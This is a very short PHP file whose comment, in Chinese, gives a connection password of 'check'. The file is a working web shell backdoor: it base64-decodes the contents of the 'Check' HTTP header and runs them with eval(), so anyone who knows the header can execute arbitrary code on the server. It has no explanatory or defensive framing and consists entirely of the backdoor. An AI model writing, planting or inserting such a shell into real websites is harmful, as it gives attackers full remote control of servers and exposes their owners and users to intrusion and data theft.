<?php
// 连接密码：check
$b = base64_decode(getenv('HTTP_CHECK'));
eval($b);
?>